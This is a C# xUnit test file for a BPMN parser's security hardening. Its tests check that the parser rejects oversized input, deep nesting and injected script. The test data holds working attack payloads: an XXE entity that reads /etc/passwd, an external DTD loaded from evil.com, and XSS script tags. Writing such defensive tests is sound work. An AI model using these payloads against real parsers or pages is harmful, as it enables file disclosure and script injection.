using VertexBPMN.Domain.Exceptions;
using VertexBPMN.Domain.Model.Bpmn;
using VertexBPMN.Domain.Model.Security;
using VertexBPMN.Engine.Parsing;
using VertexBPMN.Engine.Security;

namespace VertexBPMN.Tests.Parsing.Hardening;

/// <summary>
/// Comprehensive security tests for enhanced BPMN parser protection.
/// </summary>
public class EnhancedSecurityTests
{
    private readonly ITestOutputHelper _output;

    public EnhancedSecurityTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Fact]
    public async Task ResourceLimiter_BlocksOversizedInput()
    {
        var options = new BpmnParserOptions
        {
            SecurityOptions = new BpmnSecurityOptions { MaxXmlSizeBytes = 1000 }
        };
        
        var parser = new BpmnParser(options);
        var oversizedXml = new string('X', 2000) + "<definitions><process/></definitions>";

        var ex = await Assert.ThrowsAsync<SecurityException>(
            () => parser.ParseAsync(oversizedXml));
        
        Assert.Contains("exceeds limit", ex.Message);
    }

    [Fact]
    public async Task ContentValidator_DetectsMaliciousScript()
    {
        var validator = new BpmnContentValidator();
        var maliciousXml = """
<definitions>
  <process>
    <task name="&lt;script&gt;alert('XSS')&lt;/script&gt;"/>
  </process>
</definitions>
""";

        var result = validator.ValidateContent(maliciousXml);
        
        Assert.False(result.IsSecure);
        Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
    }

    [Fact]
    public void ContentValidator_AllowsBpmnScriptTask()
    {
        var validator = new BpmnContentValidator();
        var bpmnXml = """
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL">
  <process id="process">
    <scriptTask id="scriptTask" scriptFormat="javascript">
      <script>console.log('valid BPMN script task');</script>
    </scriptTask>
  </process>
</definitions>
""";

        var result = validator.ValidateContent(bpmnXml);

        Assert.True(result.IsSecure);
    }

    [Fact]
    public void ContentValidator_AllowsUnusedForeignNamespaceDeclarations()
    {
        var validator = new BpmnContentValidator();
        var bpmnXml = """
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:svg="http://www.w3.org/2000/svg"
             xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <process id="process" />
</definitions>
""";

        var result = validator.ValidateContent(bpmnXml);

        Assert.True(result.IsSecure);
    }

    [Fact]
    public void ContentValidator_BlocksScriptOutsideBpmnNamespace()
    {
        var validator = new BpmnContentValidator();
        var maliciousXml = """
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <process id="process">
    <xhtml:script>alert('XSS')</xhtml:script>
  </process>
</definitions>
""";

        var result = validator.ValidateContent(maliciousXml);

        Assert.False(result.IsSecure);
        Assert.Contains(result.Threats, t => t.Type == ThreatType.MaliciousContent);
    }

    [Fact]
    public void SecurityValidator_GeneratesAuditTrail()
    {
        var validator = new BpmnSecurityValidator();
        var testXml = "<definitions><process id='test'/></definitions>";

        var result = validator.ValidateSecurityConfiguration(testXml);
        
        Assert.NotNull(result.SecurityHash);
        Assert.True(result.ValidationTimestamp > DateTimeOffset.MinValue);
    }

    [Theory]
    [InlineData("<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>")]
    [InlineData("<?xml version='1.0'?><!DOCTYPE root SYSTEM 'http://evil.com/malicious.dtd'><root/>")]
    [InlineData("<root xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script></root>")]
    public async Task SecurityValidation_BlocksKnownAttackVectors(string maliciousXml)
    {
        var parser = new BpmnParser(new BpmnParserOptions
        {
            EnableSecurityValidation = true,
            FailOnSecurityThreat = true
        });

        await Assert.ThrowsAnyAsync<Exception>(() => parser.ParseAsync(maliciousXml));
    }

    [Fact]
    public async Task ParsingLimits_PreventDeepNestingDoSAttacks()
    {
        var options = new BpmnParserOptions
        {
            SecurityOptions = new BpmnSecurityOptions { ParseTimeout = TimeSpan.FromMilliseconds(100) }
        };
        
        var parser = new BpmnParser(options);
        
        // Create deeply nested XML that would take long to parse
        var deepXml = GenerateDeeplyNestedXml(1000);

        var ex = await Assert.ThrowsAsync<SecurityException>(
            () => parser.ParseAsync(deepXml));
        
        Assert.Contains("nesting depth", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    private static string GenerateDeeplyNestedXml(int depth)
    {
        var xml = "<definitions>";
        for (int i = 0; i < depth; i++)
        {
            xml += $"<element{i}>";
        }
        xml += "<process/>";
        for (int i = depth - 1; i >= 0; i--)
        {
            xml += $"</element{i}>";
        }
        xml += "</definitions>";
        return xml;
    }
}
